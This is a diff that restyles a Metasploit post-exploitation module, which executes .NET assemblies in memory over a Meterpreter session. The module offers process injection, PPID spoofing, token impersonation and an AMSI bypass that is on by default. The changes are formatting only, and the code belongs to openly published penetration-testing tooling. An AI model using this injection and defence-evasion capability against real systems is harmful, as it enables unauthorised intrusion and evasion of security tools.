@@ -14,27 +14,30 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Dotnet
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Execute .net Assembly (x64 only)',
-      'Description' => '
-        This module execute a .net assembly in memory. Reflectively load the dll that will host CLR, then
-        copy in memory the assembly that will be executed. Credits for Amsi bypass to Rastamouse (@_RastaMouse)
-      ',
-      'License' => MSF_LICENSE,
-      'Author' => 'b4rtik',
-      'Arch' => [ARCH_X64],
-      'Platform' => 'win',
-      'SessionTypes' => ['meterpreter'],
-      'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
-      'References' => [['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']],
-      'DefaultTarget' => 0
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Execute .net Assembly (x64 only)',
+        'Description' => %q{
+          This module execute a .net assembly in memory. Reflectively load the dll that will host CLR, then
+          copy in memory the assembly that will be executed. Credits for Amsi bypass to Rastamouse (@_RastaMouse)
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'b4rtik',
+        'Arch' => [ARCH_X64],
+        'Platform' => 'win',
+        'SessionTypes' => ['meterpreter'],
+        'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
+        'References' => [['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']],
+        'DefaultTarget' => 0
+      )
+    )
     register_options(
       [
         OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
-        OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
-        OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation',true]),
+        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
+        OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation', true]),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
         OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
         OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
@@ -45,48 +48,49 @@ class MetasploitModule < Msf::Post
 
     register_advanced_options(
       [
-        OptBool.new('KILL',   [ true, 'Kill the injected process at the end of the task', false ])
+        OptBool.new('KILL', [ true, 'Kill the injected process at the end of the task', false ])
       ]
     )
   end
+
   def check_dotnet_version
     vprint_status("DOTNET VERSIONS:  #{get_dotnet_versions}")
   end
 
   def find_required_clr(exe_path)
     filecontent = File.read(exe_path).bytes
-    sign = "v4.0.30319".bytes
-    filecontent.each_with_index do |item, index|
+    sign = 'v4.0.30319'.bytes
+    filecontent.each_with_index do |_item, index|
       sign.each_with_index do |subitem, indexsub|
         if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)
           break
         else
           if indexsub == 9
-            vprint_status("CLR versione required v4.0.30319")
-            return "v4.0.30319"
+            vprint_status('CLR versione required v4.0.30319')
+            return 'v4.0.30319'
           end
         end
       end
     end
-    vprint_status("CLR versione required v2.0.50727")
-    return "v2.0.50727"
+    vprint_status('CLR versione required v2.0.50727')
+    return 'v2.0.50727'
   end
 
   def check_requirements(clr_req, installed_dotnet_versions)
-    installed_dotnet_versions.each do | fi |
-      if clr_req == "v4.0.30319"
-        if fi[0] == "4"
-          vprint_status("Requirements ok")
+    installed_dotnet_versions.each do |fi|
+      if clr_req == 'v4.0.30319'
+        if fi[0] == '4'
+          vprint_status('Requirements ok')
           return true
         end
       else
-        if fi[0] == "3"
-          vprint_status("Requirements ok")
+        if fi[0] == '3'
+          vprint_status('Requirements ok')
           return true
         end
       end
     end
-    vprint_status("Requirements ko")
+    vprint_status('Requirements ko')
     return false
   end
 
@@ -94,11 +98,11 @@ class MetasploitModule < Msf::Post
     installed_dotnet_versions = get_dotnet_versions
     vprint_status("Dot Net Versions installed on target: #{installed_dotnet_versions}")
     if installed_dotnet_versions == []
-      fail_with(Failure::BadConfig, "Target has no .NET framework installed")
+      fail_with(Failure::BadConfig, 'Target has no .NET framework installed')
     end
     exe_path = datastore['DOTNET_EXE']
     if check_requirements(find_required_clr(exe_path), installed_dotnet_versions) == false
-      fail_with(Failure::BadConfig, "CLR required for assembly not installed")
+      fail_with(Failure::BadConfig, 'CLR required for assembly not installed')
     end
     if File.file?(exe_path)
       assembly_size = File.size(exe_path)
@@ -131,18 +135,18 @@ class MetasploitModule < Msf::Post
     end
 
     host_processes = client.sys.process.get_processes
-    if host_processes.length < 1
-      print_bad("No running processes found on the target host.")
+    if host_processes.empty?
+      print_bad('No running processes found on the target host.')
       return false
     end
 
-    theprocess = host_processes.find {|x| x["pid"] == pid}
+    theprocess = host_processes.find { |x| x['pid'] == pid }
 
     !theprocess.nil?
   end
 
   def launch_process
-    if datastore['PPID'] != 0 and not pid_exists(datastore['PPID'])
+    if (datastore['PPID'] != 0) && !pid_exists(datastore['PPID'])
       print_error("Process #{datastore['PPID']} was not found")
       return false
     elsif datastore['PPID'] != 0
@@ -196,12 +200,12 @@ class MetasploitModule < Msf::Post
 
   def execute_assembly(exe_path)
     print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?
-    if datastore['PID'] > 0 or datastore['WAIT'] == 0 or datastore['PPID'] > 0
+    if (datastore['PID'] > 0) || (datastore['WAIT'] == 0) || (datastore['PPID'] > 0)
       print_warning('Output unavailable')
     end
 
-    if datastore['PPID'] != 0 and datastore['PID'] != 0
-      print_error("PID and PPID are mutually exclusive")
+    if (datastore['PPID'] != 0) && (datastore['PID'] != 0)
+      print_error('PID and PPID are mutually exclusive')
       return false
     end
 
@@ -221,7 +225,7 @@ class MetasploitModule < Msf::Post
       sleep(datastore['WAIT'])
     end
 
-    if datastore['PID'] <= 0 and datastore['WAIT'] > 0 and datastore['PPID'] <= 0
+    if (datastore['PID'] <= 0) && (datastore['WAIT'] > 0) && (datastore['PPID'] <= 0)
       read_output(process)
     end
 
@@ -279,13 +283,12 @@ class MetasploitModule < Msf::Post
     begin
       loop do
         output = process.channel.read
-        if !output.nil? and output.length > 0
+        if !output.nil? && !output.empty?
           output.split("\n").each { |x| print_good(x) }
         end
-        break if output.nil? or output.length == 0
+        break if output.nil? || output.empty?
       end
     rescue Rex::TimeoutError => e
-
     rescue ::Exception => e
       print_error("Exception: #{e.inspect}")
     end
